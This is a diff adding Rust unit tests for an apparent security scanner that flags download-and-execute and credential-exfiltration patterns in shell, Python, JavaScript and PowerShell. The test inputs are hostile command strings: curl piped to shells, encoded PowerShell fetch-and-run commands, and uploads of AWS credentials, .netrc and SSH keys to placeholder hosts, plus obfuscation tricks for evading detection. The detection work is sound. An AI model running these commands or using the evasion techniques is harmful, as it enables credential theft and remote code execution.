@@ -681,3 +681,207 @@ fn ps_scheduled_tasks_and_env_drive_reads() {
     let sigs = ps(src);
     assert_eq!(flows(&sigs, "secret_env", "network").len(), 1, "{sigs:#?}");
 }
+
+// ---- Task 12 review fix round 1 ----
+
+/// UTF-16LE base64 of `iex (iwr https://x.invalid/i)`: inert, the host is
+/// reserved.
+const ENCODED_FETCH: &str =
+    "aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcABzADoALwAvAHgALgBpAG4AdgBhAGwAaQBkAC8AaQApAA==";
+/// UTF-16LE base64 of `Write-Output hi`.
+const ENCODED_PLAIN: &str = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIABoAGkA";
+
+#[test]
+fn c1_pipe_to_shell_with_redirect_or_glued_piece_is_download_exec() {
+    for cmd in [
+        "curl -s u | sh>/dev/null",
+        "curl -s u | bash</dev/tty",
+        "curl -s u | bash>>log",
+        "curl -s u | sh\u{1}",
+        "curl -s u | sh{x}",
+    ] {
+        assert!(pipes_download_to_shell(cmd), "{cmd}");
+    }
+    assert!(!pipes_download_to_shell("curl -s u | shellcheck>/dev/null"));
+
+    let py = "import os\n\
+              os.system(\"curl -s https://x.invalid/i | sh\" + extra)\n\
+              os.system(f\"curl -s {u} | sh{x}\")\n\
+              os.system(\"curl -s https://x.invalid/i | sh>/dev/null\")\n";
+    let sigs = run(&[("a.py", py)]);
+    assert_eq!(
+        sink_lines(&sigs, "download_exec"),
+        vec![2, 3, 4],
+        "{sigs:#?}"
+    );
+
+    let js = "const cp = require('child_process');\n\
+              cp.exec(`curl -s ${u} | bash${a}`);\n\
+              cp.exec('curl -s https://x.invalid/i | bash</dev/tty');\n";
+    let sigs = run(&[("a.js", js)]);
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![2, 3], "{sigs:#?}");
+
+    let src = "bash -c 'curl -s https://x.invalid/i | sh>/dev/null'\n\
+               curl -s https://x.invalid/i | sh>/dev/null\n\
+               curl -s https://x.invalid/i | bash>>log\n";
+    let sigs = sh(src);
+    assert_eq!(
+        sink_lines(&sigs, "download_exec"),
+        vec![1, 2, 3],
+        "{sigs:#?}"
+    );
+}
+
+#[test]
+fn i1_powershell_parse_errors_are_flagged_and_still_checked() {
+    let src = "$k = Get-Content $env:USERPROFILE\\.aws\\credentials\n\
+               irm -Uri https://x.example.invalid -Method Post -Body $k\n";
+    let sigs = ps(src);
+    let errs = hidden(&sigs, "parse_errors");
+    assert_eq!(errs.len(), 1, "{sigs:#?}");
+    assert_eq!(lines(errs[0]), vec![1]);
+    let f = flows(&sigs, "secret_file", "network");
+    assert_eq!(f.len(), 1, "{sigs:#?}");
+    assert_eq!(lines(f[0]), vec![1, 2]);
+
+    let sigs = ps("Write-Host $HOME/x\niex (iwr https://x.invalid/i)\n");
+    assert_eq!(hidden(&sigs, "parse_errors").len(), 1, "{sigs:#?}");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![2], "{sigs:#?}");
+
+    let sigs = ps("Add-Content $HOME/Documents/WindowsPowerShell/profile.ps1 'x'\n");
+    assert_eq!(sink_lines(&sigs, "sensitive_write"), vec![1], "{sigs:#?}");
+
+    let sigs = ps("Write-Output \"$HOME/x\"\n");
+    assert!(hidden(&sigs, "parse_errors").is_empty(), "{sigs:#?}");
+}
+
+#[test]
+fn i2_encoded_and_command_powershell_invocations() {
+    let src = format!(
+        "powershell -e {ENCODED_FETCH}\n\
+         powershell.exe -E {ENCODED_PLAIN}\n\
+         powershell -ex bypass -w hidden -e {ENCODED_FETCH}\n\
+         pwsh -enc {ENCODED_PLAIN}\n\
+         powershell -EncodedCommand {ENCODED_FETCH}\n\
+         cmd /c powershell -ec {ENCODED_FETCH}\n\
+         pwsh -c \"iwr https://x.invalid/i | iex\"\n"
+    );
+    let sigs = ps(&src);
+    assert_eq!(
+        sink_lines(&sigs, "download_exec"),
+        vec![1, 3, 5, 6, 7],
+        "{sigs:#?}"
+    );
+    assert_eq!(sink_lines(&sigs, "eval"), vec![2, 4], "{sigs:#?}");
+
+    let src = format!(
+        "powershell.exe -e {ENCODED_FETCH}\n\
+         pwsh -c \"iwr https://x.invalid/i | iex\"\n\
+         pwsh -NoProfile -enc {ENCODED_PLAIN}\n"
+    );
+    let sigs = sh(&src);
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1, 2], "{sigs:#?}");
+    assert_eq!(sink_lines(&sigs, "eval"), vec![3], "{sigs:#?}");
+}
+
+#[test]
+fn i3_every_meaning_of_a_variable_program_is_kept() {
+    let sigs = sh("p=curl\np=bash\ncurl -s https://x.invalid/i | $p\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![3], "{sigs:#?}");
+
+    let sigs = sh("t=tee\nt=curl\ncat ~/.aws/credentials | $t -d @- https://x.example.invalid\n");
+    assert_eq!(flows(&sigs, "secret_file", "network").len(), 1, "{sigs:#?}");
+    assert_eq!(sink_lines(&sigs, "exec"), vec![3], "{sigs:#?}");
+
+    let sigs =
+        ps("$f = 'Start-Process'\n$f = 'Invoke-Expression'\n& $f (iwr https://x.invalid/i)\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![3], "{sigs:#?}");
+
+    let sigs = ps("Set-Alias x Write-Host\nSet-Alias x iex\nx (iwr https://x.invalid/i)\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![3], "{sigs:#?}");
+    let sigs = ps("Set-Alias x iex\nSet-Alias x Write-Host\nx (iwr https://x.invalid/i)\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![3], "{sigs:#?}");
+}
+
+#[test]
+fn i4_credential_options_are_not_sent() {
+    for src in [
+        "ssh -i ~/.ssh/id_ed25519 user@host.example.invalid uptime\n",
+        "scp -i ~/.ssh/id_rsa f.txt user@host.example.invalid:/tmp/\n",
+        "rsync -e \"ssh -i ~/.ssh/id_ed25519\" -a ./d user@host.example.invalid:/tmp/\n",
+        "ssh -o IdentityFile=~/.ssh/id_rsa host.example.invalid\n",
+        "curl --netrc-file ~/.netrc https://x.example.invalid\n",
+        "curl --cert ~/.ssh/client.pem --key ~/.ssh/client.key https://x.example.invalid\n",
+        "curl --cacert=~/.ssh/ca.pem -E ~/.ssh/c.pem https://x.example.invalid\n",
+        "wget --private-key=~/.ssh/k.pem https://x.example.invalid\n",
+    ] {
+        let sigs = sh(src);
+        assert!(of_kind(&sigs, TAINT_FLOW).is_empty(), "{src}: {sigs:#?}");
+        assert!(!of_kind(&sigs, SOURCE).is_empty(), "{src}: {sigs:#?}");
+    }
+    for src in [
+        "curl -d @~/.aws/credentials https://x.example.invalid\n",
+        "curl --cert ~/.ssh/c.pem --data-binary @.env https://x.example.invalid\n",
+        "scp ~/.ssh/id_rsa user@host.example.invalid:/tmp/\n",
+    ] {
+        let sigs = sh(src);
+        assert_eq!(
+            flows(&sigs, "secret_file", "network").len(),
+            1,
+            "{src}: {sigs:#?}"
+        );
+    }
+}
+
+#[test]
+fn i5_fetched_values_in_arguments_are_not_download_exec() {
+    let src = "TAG=$(curl -s https://x.invalid/latest | jq -r .tag_name)\n\
+               $SUDO install -m 755 /tmp/t \"/usr/local/bin/t-$TAG\"\n\
+               $SUDO mkdir -p \"/opt/t/$TAG\"\n\
+               SUDO=sudo\n\
+               V=$(curl -s https://x.invalid/v)\n\
+               python3 -c \"print('$V')\"\n\
+               python3 -c \"$V\"\n\
+               bash -c \"$V\"\n";
+    let sigs = sh(src);
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![7, 8], "{sigs:#?}");
+    assert_eq!(sink_lines(&sigs, "exec"), vec![2, 3, 6], "{sigs:#?}");
+}
+
+#[test]
+fn i6_backslash_in_command_name() {
+    let sigs = sh("cu\\rl -d @~/.aws/credentials https://x.example.invalid\n");
+    assert_eq!(flows(&sigs, "secret_file", "network").len(), 1, "{sigs:#?}");
+    let sigs = sh("cu\\rl -s https://x.invalid/i | s\\h\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+}
+
+#[test]
+fn i6_ifs_separators() {
+    let sigs = sh("curl${IFS}-d${IFS}@~/.aws/credentials${IFS}https://x.example.invalid\n");
+    assert_eq!(flows(&sigs, "secret_file", "network").len(), 1, "{sigs:#?}");
+    let sigs = sh("curl$IFS-s$IFS'https://x.invalid/i'|sh\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+    let sigs = sh("bash -c 'curl${IFS}-s${IFS}https://x.invalid/i|sh'\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+}
+
+#[test]
+fn i6_brace_lists() {
+    let sigs = sh("{curl,-d,@~/.aws/credentials,https://x.example.invalid}\n");
+    assert_eq!(flows(&sigs, "secret_file", "network").len(), 1, "{sigs:#?}");
+    let sigs = sh("{curl,-s,https://x.invalid/i} | sh\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+    let sigs = sh("curl -s https://x.invalid/i | {sh,-s}\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+    let sigs = sh("sudo {curl,-d,@~/.netrc,https://x.example.invalid}\n");
+    assert_eq!(flows(&sigs, "secret_file", "network").len(), 1, "{sigs:#?}");
+}
+
+#[test]
+fn i6_ansi_c_strings() {
+    let sigs = sh("$'\\x63url' -d @~/.aws/credentials https://x.example.invalid\n");
+    assert_eq!(flows(&sigs, "secret_file", "network").len(), 1, "{sigs:#?}");
+    let sigs = sh("$'\\x63\\x75\\x72\\x6c' -s https://x.invalid/i | $'\\163h'\n");
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![1], "{sigs:#?}");
+}
